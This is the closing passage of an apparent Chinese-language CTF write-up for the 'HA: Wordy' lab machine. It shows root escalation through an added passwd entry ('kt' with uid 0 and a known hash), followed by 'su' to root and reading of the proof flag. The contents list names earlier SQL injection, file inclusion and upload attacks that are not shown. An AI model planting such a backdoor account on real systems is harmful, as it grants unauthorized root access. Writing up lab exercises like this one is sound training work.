class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:110:116:user <span class="keyword">for</span> cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:112:117::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">saned:x:114:119::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/<span class="literal">false</span></span><br><span class="line">geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/<span class="literal">false</span></span><br><span class="line">gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/<span class="literal">false</span></span><br><span class="line">raj:x:1000:1000:raj,,,:/home/raj:/bin/bash</span><br><span class="line">mysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:124:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">kt:<span class="variable">$1</span><span class="variable">$kt</span><span class="variable">$mR</span>/jSFSDV/G0vNQ72T8cs.:0:0:root:/root:/bin/bash</span><br><span class="line">www-data@ubuntu:/etc$ su kt</span><br><span class="line">su kt</span><br><span class="line">Password: 123</span><br><span class="line"></span><br><span class="line">root@ubuntu:/etc<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:/etc<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h2 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/etc<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@ubuntu:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">proof.txt</span><br><span class="line">root@ubuntu:~<span class="comment"># cat proof.txt</span></span><br><span class="line">cat proof.txt</span><br><span class="line">_________________________________________________________________________</span><br><span class="line"> _____     _   _   U _____ u     U _____ u   _   _       ____     	|	</span><br><span class="line"> |_ <span class="string">" _|   |'| |'|  \| ___"</span>|/     \| ___<span class="string">"|/  | \ |"</span>|     |  _<span class="string">"\   	|</span></span><br><span class="line"><span class="string">   | |    /| |_| |\  |  _|"</span>        |  _|<span class="string">"   &lt;|  \| |&gt;   /| | | |  	|	</span></span><br><span class="line"><span class="string">  /| |\   U|  _  |u  | |___        | |___   U| |\  |u   U| |_| |\ 	|</span></span><br><span class="line"><span class="string"> u |_|U    |_| |_|   |_____|       |_____|   |_| \_|     |____/ u 	|</span></span><br><span class="line"><span class="string"> _// \\_   //   \\   &lt;&lt;   &gt;&gt;       &lt;&lt;   &gt;&gt;   ||   \\,-.   |||_    	|</span></span><br><span class="line"><span class="string">(__) (__) (_"</span>) (<span class="string">"_) (__) (__)     (__) (__)  (_"</span>)  (_/   (__)_)   	|</span><br><span class="line">									|</span><br><span class="line">									|</span><br><span class="line">!! Congrats you have finished this task !!				|</span><br><span class="line">									|</span><br><span class="line">Contact us here:							|</span><br><span class="line">									|</span><br><span class="line">Hacking Articles : https://twitter.com/rajchandel/			|</span><br><span class="line">									|</span><br><span class="line">									|</span><br><span class="line">+-+-+-+-+-+ +-+-+-+-+-+-+-+						|</span><br><span class="line"> |E|n|j|o|y| |H|A|C|K|I|N|G|						|</span><br><span class="line"> +-+-+-+-+-+ +-+-+-+-+-+-+-+						|</span><br><span class="line">________________________________________________________________________|</span><br><span class="line"></span><br><span class="line">                                                </span><br><span class="line"></span><br><span class="line">root@ubuntu:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://www.yuque.com/kali-team">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-8351-远程文件包含"><span class="toc-number">3.</span> <span class="toc-text">CVE-2015-8351 远程文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地文件包含"><span class="toc-number">4.</span> <span class="toc-text">本地文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-number">5.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF越权"><span class="toc-number">6.</span> <span class="toc-text">CSRF越权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#插件认证文件上传"><span class="toc-number">7.</span> <span class="toc-text">插件认证文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提Root权权限"><span class="toc-number">8.</span> <span class="toc-text">提Root权权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取Flag"><span class="toc-number">9.</span> <span class="toc-text">获取Flag</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&text=ha-wordy-Write-up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&title=ha-wordy-Write-up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&is_video=false&description=ha-wordy-Write-up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ha-wordy-Write-up&body=Check out this article: https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&title=ha-wordy-Write-up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&title=ha-wordy-Write-up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&title=ha-wordy-Write-up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&title=ha-wordy-Write-up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&name=ha-wordy-Write-up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 Kali-Team
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://www.yuque.com/kali-team">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-141810677-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
